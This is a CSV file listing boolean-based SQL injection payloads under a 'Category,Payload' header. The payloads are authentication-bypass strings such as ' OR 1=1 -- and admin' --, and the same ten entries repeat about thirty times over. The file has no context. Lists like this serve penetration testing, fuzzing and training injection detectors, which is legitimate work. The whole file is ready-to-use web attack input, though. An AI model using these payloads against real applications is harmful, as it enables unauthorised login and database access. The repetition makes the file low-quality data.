Category,Payload
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
boolean_based,admin' OR '1'='1
boolean_based,' OR 1=1 --
boolean_based,' OR '1'='1
boolean_based,1' OR '1'='1' --
boolean_based,' OR 'x'='x
boolean_based,1 OR 1=1
boolean_based,' OR 1=1#
boolean_based,' OR 1=1--
boolean_based,admin' --
boolean_based,admin' #
